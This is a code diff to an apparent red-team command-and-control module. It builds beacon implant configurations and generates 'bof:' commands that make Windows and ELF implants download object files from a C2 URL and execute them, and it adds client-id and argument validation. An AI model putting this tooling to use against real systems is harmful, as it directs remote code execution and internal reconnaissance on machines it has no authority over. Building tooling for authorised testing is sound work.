@@ -30,6 +30,7 @@ Usage:
 from __future__ import annotations
 
 import logging
+import re
 from dataclasses import dataclass, field
 from typing import Any
 
@@ -37,7 +38,8 @@ log = logging.getLogger("beacon_config_builder")
 
 C2_PROTOCOL_HTTPS = "https"
 C2_PROTOCOL_HTTP = "http"
-BEAON_CONFIG_JSON_PATH = "sessions/implant_config_{name}.json"
+BEACON_CONFIG_JSON_PATH = "sessions/implant_config_{name}.json"
+_DOWNLOAD_SEGMENT = "download"
 
 
 @dataclass
@@ -413,38 +415,108 @@ class BeaconConfigBuilder:
             return cls(_json.load(f))
 
 
+_BOFS_URL_SEGMENT = "bofs"
+_DOWNLOAD_SEGMENT = "download"
+_CLIENT_ID_MAX_LENGTH = 128
+_CLIENT_ID_ALLOWED = re.compile(r"^[A-Za-z0-9_-]{1,128}$")
+_URL_TOKEN_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._/-]{0,64}$")
+
+
+def sanitize_client_id(client_id: str) -> str:
+    """Return a strict beacon client id safe for URLs and file paths.
+
+    The beacon protocol identifies sessions with a client id that also
+    becomes a file name on the C2; only alphanumerics, hyphen and
+    underscore are allowed.
+
+    Args:
+        client_id: Raw operator-supplied beacon id.
+
+    Returns:
+        The cleaned id.
+
+    Raises:
+        ValueError: When the id is empty or contains other characters.
+    """
+    cleaned = "".join(c for c in str(client_id or "") if c.isalnum() or c in "-_")
+    if not cleaned or len(cleaned) > _CLIENT_ID_MAX_LENGTH:
+        raise ValueError(f"invalid beacon client id: {client_id!r}")
+    if cleaned != client_id or not _CLIENT_ID_ALLOWED.match(cleaned):
+        raise ValueError(f"beacon client id must match {_CLIENT_ID_ALLOWED.pattern}: {client_id!r}")
+    return cleaned
+
+
 def generate_bof_execution_command(
     bof_name: str,
     c2_url: str,
-    client_id: str,
     args: list[str] | None = None,
-    bofs_dir: str = "bofs",
+    bofs_dir: str = _BOFS_URL_SEGMENT,
 ) -> str:
-    """Generate a ``bof:<url>`` command that the C beacon executes.
+    """Generate a ``bof:<url>[ <args>]`` command that a beacon executes.
 
-    The C beacon downloads the BOF from the C2 endpoint and executes it
-    via its internal COFFLoader. This function produces the exact command
-    string the operator should issue to the C2 to deploy a BOF.
+    Both beacon interpreters (the Windows COFFLoader beacon and the
+    BlackSandBeacon ELF loader) parse the payload ``bof:`` prefix, then
+    the URL, then a single space, then the argument string. Everything
+    after the first space is passed verbatim to the BOF ``go`` entry
+    point as the argument buffer, so arguments are joined with commas.
 
     Args:
         bof_name: BOF catalog name (e.g., ``ldap_enum``).
         c2_url: C2 base URL (e.g., ``https://10.10.14.1:4444``).
-        client_id: Target beacon client ID.
-        args: Optional arguments to pass to the BOF.
+        args: Optional arguments to pass to the BOF as one comma-joined string.
+        bofs_dir: URL segment under ``/download/`` that serves the BOF.
 
     Returns:
-        A command string like ``bof:https://10.10.14.1:4444/download/bofs/ldap_enum``.
+        A command string like ``bof:https://10.10.14.1:4444/download/bofs/ldap_enum``
+        or ``bof:.../bofs/portscan 10.0.0.7,80,110`` when args are given.
+
+    Raises:
+        ValueError: When ``bof_name``, ``bofs_dir`` or an arg contains
+            characters that would break the ``bof:`` payload contract.
     """
-    bof_path = f"{c2_url}/download/{bofs_dir}/{bof_name}"
+    _validate_bof_token(bof_name, "bof_name", url_token=True)
+    _validate_bof_token(bofs_dir, "bofs_dir", url_token=True)
+    bof_path = f"{c2_url}/{_DOWNLOAD_SEGMENT}/{bofs_dir}/{bof_name}"
     cmd = f"bof:{bof_path}"
     if args:
-        arg_str = ",".join(args)
-        cmd += f":{arg_str}"
+        arg_str = ",".join(a.strip() for a in args if str(a).strip())
+        if arg_str:
+            _validate_bof_token(arg_str, "args")
+            cmd = f"{cmd} {arg_str}"
     return cmd
+
+
+def _validate_bof_token(token: str, label: str, *, url_token: bool = False) -> None:
+    """Reject tokens that would corrupt the ``bof:`` payload contract.
+
+    The payload is URL + optional space + argument buffer. A URL token
+    (``bof_name`` and ``bofs_dir``) must match the URL-safe slug grammar
+    because the beacon splits the URL from the args at the first space;
+    argument strings only must stay free of control characters and
+    newlines.
+
+    Args:
+        token: Value to validate.
+        label: Field name for the error message.
+        url_token: When True enforce the strict URL grammar.
+
+    Raises:
+        ValueError: When the token is unsafe.
+    """
+    text = str(token or "")
+    if not text or not text.strip():
+        raise ValueError(f"{label} must not be empty")
+    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in text):
+        raise ValueError(f"{label} contains control characters: {token!r}")
+    if text != text.strip():
+        raise ValueError(f"{label} has surrounding whitespace: {token!r}")
+    if url_token and not _URL_TOKEN_RE.match(text):
+        raise ValueError(f"{label} must match {_URL_TOKEN_RE.pattern}: {token!r}")
 
 
 __all__ = [
     "BeaconConfig",
     "BeaconConfigBuilder",
     "generate_bof_execution_command",
+    "sanitize_client_id",
 ]
